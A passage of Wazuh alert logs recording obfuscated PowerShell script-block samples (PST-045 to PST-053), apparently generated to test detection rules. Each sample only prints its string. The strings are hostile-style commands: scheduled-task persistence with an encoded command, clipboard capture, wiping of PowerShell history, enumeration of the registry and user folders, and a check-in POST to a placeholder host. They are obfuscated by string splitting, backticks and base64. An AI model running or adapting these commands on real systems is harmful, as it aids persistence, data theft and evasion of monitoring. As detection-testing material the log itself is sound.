\\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-045'; $parts=@('Register-ScheduledTas','k -TaskName ''U','pdateCheck'' -Action',' (New-ScheduledTaskAc','tion -Execute ''pow','ershell.exe'' -Argum','ent ''-NoProfile -Enc','odedCommand VwByAGk','AdABlAC0ATwB1AHQAcA','B1AHQAIAAnAFQASAB','FAFMASQBTAC0ASQBO','AEUAUgBUACcA'')'); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"7e3828f8-b9dc-4a43-9f91-8d124bc7d25b\"}}}","id":"1784280949.412533","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:35:49.419+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"847d2673-18fd-4d17-b928-51fef79b27ec","scriptBlockText":"$sampleId='PST-046'; $encoded='RwBlAHQALQBDAGwAaQBwAGIAbwBhAHIAZAAgAC0AUgBhAHcAIAB8ACAAQwBvAG4AdgBlAHIAdABUAG8ALQBKAHMAbwBuACAALQBDAG8AbQBwAHIAZQBzAHMA'; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721685","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-046'; $encoded='RwBlAHQALQBDAGwAaQBwAGIAbwBhAHIAZAAgAC0AUgBhAHcAIAB8ACAAQwBvAG4AdgBlAHIAdABUAG8ALQBKAHMAbwBuACAALQBDAG8AbQBwAHIAZQBzAHMA'; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 847d2673-18fd-4d17-b928-51fef79b27ec\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:35:49.1504654Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:49.1504654Z\",\"eventRecordID\":\"721685\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-046'; $encoded='RwBlAHQALQBDAGwAaQBwAGIAbwBhAHIAZAAgAC0AUgBhAHcAIAB8ACAAQwBvAG4AdgBlAHIAdABUAG8ALQBKAHMAbwBuACAALQBDAG8AbQBwAHIAZQBzAHMA'; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 847d2673-18fd-4d17-b928-51fef79b27ec\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-046'; $encoded='RwBlAHQALQBDAGwAaQBwAGIAbwBhAHIAZAAgAC0AUgBhAHcAIAB8ACAAQwBvAG4AdgBlAHIAdABUAG8ALQBKAHMAbwBuACAALQBDAG8AbQBwAHIAZQBzAHMA'; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"847d2673-18fd-4d17-b928-51fef79b27ec\"}}}","id":"1784280949.412533","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell script may be using Base64 decoding method","firedtimes":5,"groups":["windows"," powershell"],"id":"91809","level":10,"mail":false,"mitre":{"id":["T1140"],"tactic":["Defense Evasion"],"technique":["Deobfuscate/Decode Files or Information"]}},"timestamp":"2026-07-17T11:35:49.454+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"6f5768a7-4423-4eae-846a-42c22bd1fa48","scriptBlockText":"$sampleId='PST-047'; $indicator='Get-ItemProperty -Path ''HKLM:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\\\\*'''; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721687","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-047'; $indicator='Get-ItemProperty -Path ''HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*'''; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 6f5768a7-4423-4eae-846a-42c22bd1fa48\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:35:49.4899855Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:49.4899855Z\",\"eventRecordID\":\"721687\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-047'; $indicator='Get-ItemProperty -Path ''HKLM:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\\\\*'''; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 6f5768a7-4423-4eae-846a-42c22bd1fa48\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-047'; $indicator='Get-ItemProperty -Path ''HKLM:\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Uninstall\\\\\\\\*'''; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"6f5768a7-4423-4eae-846a-42c22bd1fa48\"}}}","id":"1784280950.414764","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:35:50.498+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"c7ae52c9-ed36-4a55-aed8-8ef06d7d0932","scriptBlockText":"$sampleId='PST-048'; $indicator='Clear-' + 'Histo' + 'ry; Re' + 'move-Item' + ' (Ge' + 't-PSRe' + 'adLineO' + 'ption).Hist' + 'orySave' + 'Path -Forc' + 'e'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721689","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-048'; $indicator='Clear-' + 'Histo' + 'ry; Re' + 'move-Item' + ' (Ge' + 't-PSRe' + 'adLineO' + 'ption).Hist' + 'orySave' + 'Path -Forc' + 'e'; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: c7ae52c9-ed36-4a55-aed8-8ef06d7d0932\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:35:49.8209368Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:49.8209368Z\",\"eventRecordID\":\"721689\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-048'; $indicator='Clear-' + 'Histo' + 'ry; Re' + 'move-Item' + ' (Ge' + 't-PSRe' + 'adLineO' + 'ption).Hist' + 'orySave' + 'Path -Forc' + 'e'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: c7ae52c9-ed36-4a55-aed8-8ef06d7d0932\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-048'; $indicator='Clear-' + 'Histo' + 'ry; Re' + 'move-Item' + ' (Ge' + 't-PSRe' + 'adLineO' + 'ption).Hist' + 'orySave' + 'Path -Forc' + 'e'; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"c7ae52c9-ed36-4a55-aed8-8ef06d7d0932\"}}}","id":"1784280950.414764","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:35:50.502+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"fc1426a8-ed3a-41a7-84c6-9d5601c3eae3","scriptBlockText":"$sampleId='PST-049'; $indicator='inVokE-ReSTMetHod -meTHOd PoST -urI ''hTTPS://aPI.eXAmplE.INvaLID/CHeckiN'' -bOdy @{hOsT=''ws-01'';uSEr=''analySt'';sTAtUS=''ok''}'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721693","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-049'; $indicator='inVokE-ReSTMetHod -meTHOd PoST -urI ''hTTPS://aPI.eXAmplE.INvaLID/CHeckiN'' -bOdy @{hOsT=''ws-01'';uSEr=''analySt'';sTAtUS=''ok''}'; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: fc1426a8-ed3a-41a7-84c6-9d5601c3eae3\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:35:50.1584591Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:50.1584591Z\",\"eventRecordID\":\"721693\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-049'; $indicator='inVokE-ReSTMetHod -meTHOd PoST -urI ''hTTPS://aPI.eXAmplE.INvaLID/CHeckiN'' -bOdy @{hOsT=''ws-01'';uSEr=''analySt'';sTAtUS=''ok''}'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: fc1426a8-ed3a-41a7-84c6-9d5601c3eae3\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-049'; $indicator='inVokE-ReSTMetHod -meTHOd PoST -urI ''hTTPS://aPI.eXAmplE.INvaLID/CHeckiN'' -bOdy @{hOsT=''ws-01'';uSEr=''analySt'';sTAtUS=''ok''}'; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"fc1426a8-ed3a-41a7-84c6-9d5601c3eae3\"}}}","id":"1784280950.414764","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:35:50.511+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"1c1dddff-baa1-4623-a06d-95a0d5ed8b0b","scriptBlockText":"$sampleId='PST-050'; @{host=$env:COMPUTERNAME; user=$env:USERNAME} | ConvertTo-Json; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721697","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-050'; @{host=$env:COMPUTERNAME; user=$env:USERNAME} | ConvertTo-Json; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 1c1dddff-baa1-4623-a06d-95a0d5ed8b0b\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:35:50.4768245Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:50.4768245Z\",\"eventRecordID\":\"721697\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-050'; @{host=$env:COMPUTERNAME; user=$env:USERNAME} | ConvertTo-Json; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 1c1dddff-baa1-4623-a06d-95a0d5ed8b0b\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-050'; @{host=$env:COMPUTERNAME; user=$env:USERNAME} | ConvertTo-Json; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"1c1dddff-baa1-4623-a06d-95a0d5ed8b0b\"}}}","id":"1784280950.417667","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell script querying system environment variables","firedtimes":6,"groups":["windows"," powershell"],"id":"91816","level":4,"mail":false,"mitre":{"id":["T1082"],"tactic":["Discovery"],"technique":["System Information Discovery"]}},"timestamp":"2026-07-17T11:35:50.522+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"878b0401-1dcb-49a3-b6d2-0a4d34a6aecd","scriptBlockText":"$sampleId='PST-051'; $indicator='Clear-Hi`story; Remo`ve-Item (Get-PSReadLineOption).History`Sa`vePath -Force'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721701","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-051'; $indicator='Clear-Hi`story; Remo`ve-Item (Get-PSReadLineOption).History`Sa`vePath -Force'; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 878b0401-1dcb-49a3-b6d2-0a4d34a6aecd\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:35:50.8259222Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:50.8259222Z\",\"eventRecordID\":\"721701\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-051'; $indicator='Clear-Hi`story; Remo`ve-Item (Get-PSReadLineOption).History`Sa`vePath -Force'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 878b0401-1dcb-49a3-b6d2-0a4d34a6aecd\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-051'; $indicator='Clear-Hi`story; Remo`ve-Item (Get-PSReadLineOption).History`Sa`vePath -Force'; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"878b0401-1dcb-49a3-b6d2-0a4d34a6aecd\"}}}","id":"1784280951.417667","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:35:51.567+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"a60b670a-78fc-4390-824b-7a87548b66b3","scriptBlockText":"$sampleId='PST-052'; $parts=@('get-I','TemPr`','OpeR`tY -','PaTh ''H','KLm:\\\\sof`T','WArE\\\\Mi`CRos','OFt\\\\WIND`','owS\\\\Cu`RR','ENtvERsI`on','\\\\uni`NsTa','lL\\\\*'''); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721714","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-052'; $parts=@('get-I','TemPr`','OpeR`tY -','PaTh ''H','KLm:\\sof`T','WArE\\Mi`CRos','OFt\\WIND`','owS\\Cu`RR','ENtvERsI`on','\\uni`NsTa','lL\\*'''); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: a60b670a-78fc-4390-824b-7a87548b66b3\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:35:51.1509156Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:51.1509156Z\",\"eventRecordID\":\"721714\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-052'; $parts=@('get-I','TemPr`','OpeR`tY -','PaTh ''H','KLm:\\\\sof`T','WArE\\\\Mi`CRos','OFt\\\\WIND`','owS\\\\Cu`RR','ENtvERsI`on','\\\\uni`NsTa','lL\\\\*'''); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: a60b670a-78fc-4390-824b-7a87548b66b3\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-052'; $parts=@('get-I','TemPr`','OpeR`tY -','PaTh ''H','KLm:\\\\\\\\sof`T','WArE\\\\\\\\Mi`CRos','OFt\\\\\\\\WIND`','owS\\\\\\\\Cu`RR','ENtvERsI`on','\\\\\\\\uni`NsTa','lL\\\\\\\\*'''); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"a60b670a-78fc-4390-824b-7a87548b66b3\"}}}","id":"1784280951.417667","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:35:51.711+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"fc35a5c4-1176-4bb5-b06d-cccfb076b217","scriptBlockText":"$sampleId='PST-053'; $parts=@('gEt-chi','ldITem ''','C:\\\\userS',''' -rE','c`URSe -F','oRCE -ErrO','r`AcTIo','N sI','le`NtlycOn','TI`nuE'); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721716","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-053'; $parts=@('gEt-chi','ldITem ''','C:\\userS',''' -rE','c`URSe -F','oRCE -ErrO','r`AcTIo','N sI','le`NtlycOn','TI`nuE'); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: fc35a5c4-1176-4bb5-b06d-cccfb076b217\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:35:51.4778477Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:51.4778477Z\",\"eventRecordID\":\"721716\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-053'; $parts=@('gEt-chi','ldITem ''','C:\\\\userS',''' -rE','c`URSe -F','oRCE -ErrO','r`AcTIo','N sI','le`NtlycOn','TI`nuE'); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: fc35a5c4-1176-4bb5-b06d-cccfb076b217\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-053'; $parts=@('gEt-chi','ldITem ''','C:\\\\\\\\userS',''' -rE','c`URSe -F','oRCE -ErrO','r`AcTIo','N sI','le`NtlycOn','TI`nuE'); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"fc35a5c4-1176-4bb5-b06d-cccfb076b217\"}}}","id":"1784280951.417667","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:35:51.712+0200"}
